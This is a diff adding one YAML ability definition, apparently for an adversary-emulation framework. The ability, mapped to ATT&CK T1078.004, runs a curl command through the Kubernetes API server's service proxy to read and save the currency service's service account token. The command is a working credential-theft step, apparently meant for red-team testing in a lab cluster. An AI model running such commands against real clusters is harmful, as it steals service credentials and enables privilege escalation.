@@ -1,0 +1,9 @@
+- id: 30000000-0000-0000-0000-000000000006
+  name: Path traversal currency service
+  description: Path traversal to currency service with the aim of stealing its ticket.
+  tactic: privilege-escalation
+  technique: { attack_id: T1078.004, name: "Valid Accounts: Cloud Accounts" }
+  repeatable: false
+  singleton: true
+  platforms:
+    linux: { sh: { command: "curl -sk \"$API_SERVER/api/v1/namespaces/$NSPROTO/services/currency:8081/proxy/var/run/secrets/kubernetes.io/serviceaccount/token\" > $DATA_PATH/KC3/tokenCurrency && cat $DATA_PATH/KC3/tokenCurrency", timeout: 30 } }
